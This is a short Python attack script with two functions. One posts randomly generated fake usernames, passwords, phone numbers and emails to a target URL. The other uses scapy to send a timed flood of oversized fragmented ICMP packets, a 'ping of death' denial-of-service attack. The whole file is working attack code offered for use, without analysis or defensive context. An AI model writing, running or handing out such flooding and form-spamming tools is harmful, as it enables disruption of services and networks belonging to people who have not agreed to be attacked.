import time
import requests

from random_data import (
    random__common_password,
    random_email,
    random_name,
    random_phone_number,
)
from scapy.all import *


def fake_data(ip_target, username=False, password=False, phone=False, email=False):
    """Attack to post fake data to the target"""
    credentials = {}
    # credentials.update({"ip_target": ip_target})
    if username:
        username = random_name()
        credentials.update({"username": username})
    if password:
        password = random__common_password()
        credentials.update({"password": password})
    if phone:
        phone = random_phone_number()
        credentials.update({"phone": phone})
    if email:
        email = random_email(username)
        credentials.update({"email": email})
    test = requests.post(ip_target, allow_redirects=False, data=credentials)
    print(test)
    return credentials


def ping_of_death(time_selected, ip_target):
    timeout = time.time() + 1 * int(str(time_selected))
    while time.time() < timeout:
        send(fragment(IP(dst=ip_target) / ICMP() / ("X" * 60000)), verbose=0)
